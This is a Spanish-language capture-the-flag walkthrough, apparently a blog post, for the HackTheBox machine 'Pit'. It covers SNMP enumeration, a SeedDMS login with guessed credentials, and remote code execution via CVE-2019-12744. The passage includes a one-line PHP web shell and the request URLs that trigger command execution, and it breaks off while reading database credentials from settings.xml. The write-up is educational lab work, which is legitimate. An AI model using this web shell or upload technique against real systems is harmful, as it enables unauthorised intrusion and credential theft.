# Es gigante el output.
# Es gigante el output.
...
...
|   27151: 
|_    Name: kworker/1:4-cgroup_destroy
| snmp-sysdescr: Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 #1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64
|_  System uptime: 5h48m15.86s (2089586 timeticks)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun 25 25:25:25 2021 -- 1 IP address (1 host up) scanned in 170.14 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Destacamos que es un servidor &lt;strong&gt;SNMP&lt;/strong&gt; de versi√≥n &lt;strong&gt;1&lt;/strong&gt;. Y apoy√°ndonos de &lt;a href=&quot;https://hacking-etico.com/2014/03/27/leyendo-informacion-snmp-con-snmpwalk/&quot;&gt;este recurso&lt;/a&gt; entendemos que significa el &lt;strong&gt;&lt;em&gt;public&lt;/em&gt;&lt;/strong&gt; que vemos en el escaneo:&lt;/p&gt;

&lt;p&gt;Para poder enumerar o leer informaci√≥n de un servicio &lt;strong&gt;SNMP&lt;/strong&gt; es necesario conocer algo llamado ‚Äúcomunidad‚Äù, que es simplemente el medio por el que el servicio esta publicando la informaci√≥n yyyyyyy por defecto viene con la comunidad &lt;strong&gt;public&lt;/strong&gt;, que esa es la que tenemos activa y al parecer en funcionamiento con la m√°quina (:&lt;/p&gt;

&lt;p&gt;As√≠ que teniendo la comunidad nos queda muy f√°cil empezar a enumerar‚Ä¶ Existen varias herramientas, usaremos &lt;a href=&quot;http://www.reydes.com/d/?q=Utilizar_SNMP_para_Obtener_mas_Informacion_con_Snmp_check_y_Onesixtyone&quot;&gt;snmp-check&lt;/a&gt;, &lt;a href=&quot;https://hacking-etico.com/2014/03/27/leyendo-informacion-snmp-con-snmpwalk/&quot;&gt;snmpwalk&lt;/a&gt; y &lt;a href=&quot;https://docs.oracle.com/cd/E19121-01/sf.x4140/820-6413-13/SNMP_commands_reference_appendix.html&quot;&gt;snmpbulkwalk&lt;/a&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Siguiendo &lt;a href=&quot;https://book.hacktricks.xyz/pentesting/pentesting-snmp#enumerating-snmp&quot;&gt;‚Äúlo que podemos hacer en cuanto a pentesting contra &lt;strong&gt;SNMP&lt;/strong&gt;‚Äù&lt;/a&gt; (y con ayuda de las herramientas anteriores) logramos encontrar varias cosas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346google_hacktricks_enumSNMP.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;TODO se va a tratar de estos comandos y esta guia, solo que profundizaremos un poco en cada uno.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;-snmp-check&quot;&gt;üìº &lt;u&gt;snmp-check&lt;/u&gt;&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;snmp-check&lt;/strong&gt; nos muestra de una manera linda la interacci√≥n entre dispositivos (adem√°s vemos cositas de la m√°quina), le podemos indicar, la versi√≥n &lt;code&gt;-v&lt;/code&gt;, la comunidad &lt;code&gt;-c&lt;/code&gt; y claramente el servidor &lt;strong&gt;SNMP&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± snmp-check -v1 -c public 10.10.10.241
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_snmpCheck1.png&quot; alt=&quot;346bash_snmpCheck1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‚Ä¶mucha info m√°s‚Ä¶&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_snmpCheck2.png&quot; alt=&quot;346bash_snmpCheck2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pues podemos destacar √∫nicamente la versi√≥n del sistema, lo dem√°s son procesos en ejecuci√≥n, pero no vemos ninguno relevante o que nos d√© algo m√°s de informaci√≥n, as√≠ que sigamos jugando.&lt;/p&gt;

&lt;h3 id=&quot;-snmpwalk&quot;&gt;üìº &lt;u&gt;snmpwalk&lt;/u&gt;&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;snmpwalk&lt;/strong&gt; nos ayuda a ver los mismos procesos enumerados con &lt;strong&gt;&lt;em&gt;snmp-check&lt;/em&gt;&lt;/strong&gt;, pero ya entran en juego los &lt;a href=&quot;https://book.hacktricks.xyz/pentesting/pentesting-snmp#oids&quot;&gt;&lt;strong&gt;OIDs&lt;/strong&gt;&lt;/a&gt;, que ser√≠an los &lt;em&gt;identificadores de cada objeto&lt;/em&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://book.hacktricks.xyz/pentesting/pentesting-snmp#oids&quot;&gt;Pentesting SNMP - OIDs&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Podemos hacer varias maromas con √©l, lo √∫nico que cambia (si queremos) es que debemos tomar la versi√≥n &lt;code&gt;2&lt;/code&gt;, lo dem√°s es igual:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± snmpwalk -v2c -c public 10.10.10.241
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_snmpWalk1.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‚Ä¶ m√°s cositas‚Ä¶&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_snmpWalk2.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pero claramente obtenemos lo mismo (pero muy lento, en un rato entra &lt;strong&gt;snmpbulkwalk&lt;/strong&gt; que nos ayudara a hacer muuuucho m√°s r√°pido todo).&lt;/p&gt;

&lt;p&gt;Jugando con la gu√≠a inicial vemos que podemos extraer info en concreto de alguna &lt;strong&gt;OID&lt;/strong&gt;, por ejemplo extraigamos la versi√≥n del sistema pas√°ndole el &lt;strong&gt;OID&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± snmpwalk -v2c -c public 10.10.10.241
iso.3.6.1.2.1.1.1.0 = STRING: &quot;Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 #1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64&quot;
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Sabemos que es la primera l√≠nea (para el ejemplo lo sabemos :P), pues ahora tomar√≠amos ese &lt;strong&gt;OID&lt;/strong&gt; y ejecutar√≠amos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± snmpwalk -v2c -c public 10.10.10.241 iso.3.6.1.2.1.1.1.0
iso.3.6.1.2.1.1.1.0 = STRING: &quot;Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 #1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y nos traer√≠a la l√≠nea correspondiente a ese &lt;strong&gt;OID&lt;/strong&gt; (:&lt;/p&gt;

&lt;p&gt;Algo que me di cuenta al jugar con esto es que podemos tambi√©n pasarle ‚Äúrangos‚Äù, por ejemplo:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Tenemos este &lt;strong&gt;OID&lt;/strong&gt;: &lt;code&gt;iso.3.6.1.2.1.1.1.0&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Podemos decirle que extraiga todo lo que inicie con este &lt;strong&gt;OID&lt;/strong&gt;: &lt;code&gt;iso.3.6.1.2.1.1&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Nos mostrar√≠a solo esa info:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± snmpwalk -v2c -c public 10.10.10.241 iso.3.6.1.2.1.1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_snmpWalk_exArangeOID.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Otra cosita interesante son las &lt;strong&gt;consultas extendidas&lt;/strong&gt; que nos permiten profundizar un poco m√°s en la extracci√≥n:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.circitor.fr/Mibs/Html/N/NET-SNMP-EXTEND-MIB.php&quot;&gt;Extended Queries - &lt;strong&gt;NET-SNMP-EXTEND-MID&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Jugando con ellas encontramos unos usuarios:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± snmpwalk -v2c -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjects                      
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_snmpWalk_ex_EXTENDobjects.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Al parecer un proceso de monitoreo o algo as√≠ que esta ejecutando un binario de la ruta &lt;code&gt;/usr/bin/monitor&lt;/code&gt;. Es interesante porque no es un programa que me suene que venga por default en el sistema.&lt;/li&gt;
  &lt;li&gt;Tambi√©n vemos la versi√≥n del servidor &lt;strong&gt;CentOS&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;El usuario &lt;strong&gt;root&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;Y el usuario &lt;strong&gt;michelle&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Esto podemos guardarlo por si algo (:&lt;/p&gt;

&lt;h3 id=&quot;-snmpbulkwalk&quot;&gt;üìº &lt;u&gt;snmpbulkwalk&lt;/u&gt;&lt;/h3&gt;

&lt;p&gt;üå≤ &lt;strong&gt;&lt;em&gt;The &lt;code&gt;snmpbulkwalk&lt;/code&gt; command uses the &lt;u&gt;GETBULK SNMP&lt;/u&gt; protocol feature to query for an entire tree of information about a network entity. This command &lt;u&gt;can pack more objects into the packets by specifying -repeaters-&lt;/u&gt;.&lt;/em&gt;&lt;/strong&gt; &lt;a href=&quot;https://docs.oracle.com/cd/E19121-01/sf.x4140/820-6413-13/SNMP_commands_reference_appendix.html&quot;&gt;Oracle - SNMP commands&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Ac√° si es necesario indicarle la versi√≥n &lt;code&gt;2&lt;/code&gt; de &lt;strong&gt;SNMP&lt;/strong&gt;‚Ä¶ Como sabemos que podemos hacer lo mismo que &lt;strong&gt;snmpwalk&lt;/strong&gt;, pero m√°s r√°pido, vayamos directo a lo interesante:&lt;/p&gt;

&lt;p&gt;Vimos que pod√≠amos extraer info de &lt;strong&gt;OIDs&lt;/strong&gt; en concreto y tambi√©n de &lt;strong&gt;OIDs&lt;/strong&gt; de los que conoc√≠amos su inicio‚Ä¶&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;movimiento-lateral-dms&quot;&gt;Encontrando ruta web hacia &lt;u&gt;SeedDMS&lt;/u&gt; &lt;a href=&quot;#movimiento-lateral-dms&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;Pues despu√©s de muchas pruebas intentamos extraer toooooooodo lo que inicie con &lt;code&gt;iso&lt;/code&gt; (&lt;strong&gt;1&lt;/strong&gt;) y al final (bien al final) encontramos algo distinto a lo que ten√≠amos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± snmpbulkwalk -v2c -c public 10.10.10.241 iso
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_snmpWalkbulk_ex_iso.png&quot; alt=&quot;346bash_snmpWalkbulk_ex_iso&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Opa, vemos que al parecer hay un servicio web en la ruta &lt;code&gt;/var/www/html&lt;/code&gt; llamado &lt;code&gt;/seeddms51x&lt;/code&gt;, pues podemos intentar a buscarlo en alguno de los puertos y dominios que tenemos a ver si lo encontramos‚Ä¶&lt;/p&gt;

&lt;p&gt;Finalmente al dirigirnos a:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;http://dms-pit.htb/seeddms51x/seeddms
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos redirige a:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;http://dms-pit.htb/seeddms51x/seeddms/out/out.Login.php?referuri=%2Fseeddms51x%2Fseeddms%2F
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y nos muestra:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page80dms_seeddmsLogin.png&quot; alt=&quot;346page80dms_seeddmsLogin&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Un login de un &lt;a href=&quot;https://www.sergroup.com/es/temas/que-es-dms.html&quot;&gt;DMS&lt;/a&gt; llamado &lt;a href=&quot;https://www.seeddms.org/index.php?id=2&quot;&gt;&lt;strong&gt;SeedDMS&lt;/strong&gt;&lt;/a&gt; que es un sistema para la administraci√≥n de documentos‚Ä¶&lt;/p&gt;

&lt;p&gt;Intentando algunas credenciales por default no logramos nada, pero al intentar con &lt;strong&gt;michelle&lt;/strong&gt; (que fue uno de los usuarios que encontramos antes) como &lt;em&gt;usuario&lt;/em&gt; y &lt;em&gt;contrase√±a&lt;/em&gt; logramos acceder:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page80dms_seeddmsDashboard.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Listones, vemos dos objetos, una carpeta llamada &lt;strong&gt;Docs&lt;/strong&gt; y un archivo llamado &lt;strong&gt;Upgrade Note&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;En el upgrade nos indica que debido a los problemas de seguridad de la versi√≥n &lt;code&gt;5.1.10&lt;/code&gt; el administrador decidi√≥ actualizar el servicio &lt;strong&gt;SeedDMS&lt;/strong&gt; a la versi√≥n &lt;code&gt;5.1.15&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Esto es importante ya que concocemos que version de &lt;code&gt;SeedDMS&lt;/code&gt; estamos usando, as√≠ evitamos estar tocando vulnerabilidades de otras versiones&lt;/strong&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;En la carpeta &lt;strong&gt;Docs&lt;/strong&gt; existe dentro una llamada &lt;strong&gt;Users&lt;/strong&gt; y ah√≠ residen dos m√°s:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page80dms_seeddmsDocsUsers.png&quot; alt=&quot;346page80dms_seeddmsDocsUsers&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bien, conocemos al usuario &lt;strong&gt;Jack&lt;/strong&gt; (lo guardamos por si algo).&lt;/p&gt;

&lt;p&gt;Yyy solo podemos jugar con la carpeta de &lt;strong&gt;Michelle&lt;/strong&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Enumerando encontramos los mails de cada usuario, nos sirven para conocer los usuarios y a que dominio est√°n asociados (por si algo e.e):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page80dms_seeddmsUsers.png&quot; alt=&quot;346page80dms_seeddmsUsers&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;explotacion&quot;&gt;Explotaci√≥n &lt;a href=&quot;#explotacion&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;Despu√©s de muuuuuuuuchas pruebas de exploits y cositas llamativas hacia la versi√≥n &lt;code&gt;5.1.15&lt;/code&gt; no logramos nada :/ As√≠ que empezamos a probar de todo‚Ä¶&lt;/p&gt;

&lt;p&gt;Antes de conocer la versi√≥n actual ya hab√≠a probado este exploit, pero no me hab√≠a funcionado:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/47022&quot;&gt;SeedDMS versions &lt;strong&gt;&amp;lt; 5.1.11&lt;/strong&gt; - Remote Command Execution&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Probando y probando extra√±amente funciono, lo cual no deber√≠a ser, ya que es un exploit de otra versi√≥n üòê pero pues pfff‚Ä¶&lt;/p&gt;

&lt;p&gt;As√≠ que veamos como fue el proceso:&lt;/p&gt;

&lt;p&gt;&lt;span style=&quot;color: red;&quot;&gt;1. &lt;/span&gt; Creamos el archivo, se tiene que llamar &lt;code&gt;1.php&lt;/code&gt;, no encontr√© el porqu√©, pero debe serlo, ya que con otros nombres no lo toma.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± cat 1.php 
&amp;lt;?php system($_GET['xmd']); ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;span style=&quot;color: red;&quot;&gt;2. &lt;/span&gt; Subimos el archivo al DMS.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;SeedDMS&lt;/strong&gt; (arriba a la izquierda) &amp;gt; &lt;strong&gt;Docs&lt;/strong&gt; &amp;gt; &lt;strong&gt;Users&lt;/strong&gt; &amp;gt; &lt;strong&gt;Michelle&lt;/strong&gt; &amp;gt; &lt;strong&gt;Add document&lt;/strong&gt; (arriba).&lt;/p&gt;

&lt;p&gt;Ah√≠ en el nombre colocamos &lt;code&gt;1.php&lt;/code&gt; y donde dice &lt;strong&gt;Local file&lt;/strong&gt; seleccionamos el archivo &lt;code&gt;1.php&lt;/code&gt; de nuestro sistema:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page80dms_seeddmsAddDoc_1PHP.png&quot; alt=&quot;346page80dms_seeddmsAddDoc_1PHP&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y damos clic en &lt;strong&gt;Add document&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;span style=&quot;color: red;&quot;&gt;3. &lt;/span&gt; &lt;strong&gt;Encontramos&lt;/strong&gt; el archivo subido en el servidor web.&lt;/p&gt;

&lt;p&gt;Cada archivo al existir tiene un &lt;strong&gt;ID&lt;/strong&gt;, podemos verlo al dar clic sobre √©l y en la &lt;strong&gt;URL&lt;/strong&gt; se reflejar√≠a con el par√°metro &lt;code&gt;documentid&lt;/code&gt;, en nuestro caso es el n√∫mero &lt;strong&gt;48&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Siguiendo el exploit existen dos rutas que usa &lt;strong&gt;SeedDMS&lt;/strong&gt; por default al subir archivos y guardarlos:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;data&lt;/code&gt; y &lt;code&gt;1048576&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346google_seeddms_dataY1048576.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Tomado de: &lt;a href=&quot;https://github.com/rachmari/seeddms#data-storage&quot;&gt;https://github.com/rachmari/seeddms&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;As√≠ que perfecto, tiene y toma sentido (:&lt;/p&gt;

&lt;p&gt;El exploit nos indica la siguiente ruta en la que deber√≠a existir el archivo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;http://holacomoestas.com/data/1048576/&amp;lt;document_id&amp;gt;/1.php
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y con el &lt;strong&gt;id&lt;/strong&gt;, el dominio y el comando a ejecutar quedar√≠a as√≠:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;http://dms-pit.htb/seeddms51x/seeddms/data/1048576/48/1.php?xmd=whoami
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Peeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeero al direccionarnos hacia ella nos indica que no encuentra el archivo :s&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page80dms_seeddmsRCE_fail_FnotFound.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;expl_seeddms&quot;&gt;RCE SeedDMS (&lt;u&gt;CVE-2019-12744&lt;/u&gt;) &lt;a href=&quot;#expl_seeddms&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Jugando con internet buscando info relacionada con el directorio &lt;strong&gt;data&lt;/strong&gt; y &lt;strong&gt;1048576&lt;/strong&gt; encontramos este thread el cual nos da una idea para intentar:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346google_seeddms_discussion_pathsDMS.png&quot; alt=&quot;346google_seeddms_discussion_pathsDMS&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Tomada de: &lt;a href=&quot;https://sourceforge.net/p/seeddms/discussion/general/thread/5f4164990d/?limit=25&quot;&gt;seeddms/discussion/general/installation-issues&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.redhat.com/sysadmin/install-seeddms&quot;&gt;Ac√° tambi√©n hacen referencia al directorio &lt;strong&gt;data&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;(&lt;strong&gt;En la imagen podr√≠a haber usado la herramienta de texto, pero quedo a√∫n m√°s lindo üòÖ&lt;/strong&gt;)&lt;/p&gt;

&lt;p&gt;Incluso el comentario de abajo le indica que esta configurado de manera insegura :P&lt;/p&gt;

&lt;p&gt;Parecen tachones lo que hay en la imagen, pero no, es lo que podemos intentar:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;http://dms-pit.htb/seeddms51x/seeddms
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;El &lt;strong&gt;DMS&lt;/strong&gt; esta siendo mantenido en la ruta &lt;code&gt;/seeddms51x/seeddms&lt;/code&gt;, pero podr√≠amos intentar encontrar la carpeta &lt;code&gt;data...&lt;/code&gt; fuera de √©l, o sea:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;http://dms-pit.htb/seeddms51x/data
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Puessssssssssssss:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± curl -s -L http://dms-pit.htb/seeddms51x/algoqueesperonoexistaymehagaquedarmal/ | grep title
&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;404 Not Found&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± curl -s -L http://dms-pit.htb/seeddms51x/data/ | grep title
&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;403 Forbidden&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos devuelve un &lt;strong&gt;forbidden&lt;/strong&gt;, as√≠ que existe, pero no tenemos acceso a √©l :P Perfecto, pues ahora busquemos el archivo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± curl http://dms-pit.htb/seeddms51x/data/1048576/48/1.php
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;No nos devuelve ning√∫n error ni output, as√≠ que podemos pensar que lo encontr√≥ (: pues ejecutemos un &lt;code&gt;whoami&lt;/code&gt; y un &lt;code&gt;hostname&lt;/code&gt; a ver si nos responde:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;http://dms-pit.htb/seeddms51x/data/1048576/48/1.php?xmd=whoami; echo &quot; - &quot;; hostname
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yyyy:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page80dms_seeddmsRCE_whoamiYhostname.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Listoneeeeeeeeeeeeeeeeeeeeeeees, que martirio estoo, pero tamos. Tenemos ejecuci√≥n remota de comandos en el sistema como el usuario &lt;strong&gt;nginx&lt;/strong&gt;, aprovechemos para generarnos una &lt;strong&gt;Reverse Shell&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Despu√©s de algunos intentos no lo logramos, as√≠ que tendremos que enumerar el sistema desde el servidor web.&lt;/p&gt;

&lt;p&gt;Jugando con &lt;strong&gt;Python&lt;/strong&gt; creamos una fake-shell:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/pit/fakeSheedDMS.py&quot;&gt;fakeSheedDMS.py&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;Me gusto como quedo en cuanto a lo que hace el script, nos logeamos, subimos PHP y generamos la fake-shell, peeeero como el servidor borra cada cierto los archivos de la carpeta de **michelle&lt;/strong&gt; pues jugamos con eso y cuando nos devuelva &lt;code&gt;File not found&lt;/code&gt; volvemos a subir el archivo PHP sin perder la fake-shell :)**&lt;/p&gt;

&lt;p&gt;Es medio fea, ya que no podemos movernos de la carpeta en la que aparecemos, as√≠ que tenemos que jugar con rutas absolutas o &lt;code&gt;../../../&lt;/code&gt; üòõ&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Record√© una utilidad de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; que nos permite obtener una Shell en la que podemos movernos (&lt;code&gt;cd&lt;/code&gt;) entre carpetas sin problemas, algo que en la nuestra no se puede. Esto lo hace jugando con tuber√≠as y cositas locas, les dejo el link, ta buenasa:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/s4vitar/ttyoverhttp/blob/master/tty_over_http.py&quot;&gt;github.com/s4vitar - TTY Over HTTP&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Solo deber√≠amos cambiar la URL en la que este nuestro archivo &lt;code&gt;php&lt;/code&gt; y en mi caso cambiar &lt;code&gt;cmd&lt;/code&gt; a &lt;code&gt;xmd&lt;/code&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Pero como va un poco lento (por el tema de las tuber√≠as) y como hicimos uno propio, pues juguemos con el propio e.e&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;expl_settingsXML&quot;&gt;Encontramos credenciales en el archivo settings.xml &lt;a href=&quot;#expl_settingsXML&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Enumerando encontramos un archivo llamado &lt;code&gt;settings.xml&lt;/code&gt;, en √©l vemos unas credenciales de una base de datos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ ls -la /var/www/html/seeddms51x/conf
total 40
drwxr-xr-x. 2 nginx nginx    93 Mar  2  2020 .
drwxr-xr-x. 7 nginx nginx    68 Apr 21  2020 ..
-rw-r--r--. 1 nginx nginx   261 Jan 15  2020 .htaccess
-r--------. 1 nginx nginx 11933 Apr 21  2020 settings.xml
-rw-r--r--. 1 nginx nginx 13771 Mar 14  2018 settings.xml.template
-rw-r--r--. 1 nginx nginx  4247 Feb 20  2013 stopwords.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;...
&amp;lt;!--
   - dbDriver: DB-Driver used by adodb (see adodb-readme)
   - dbHostname: DB-Server
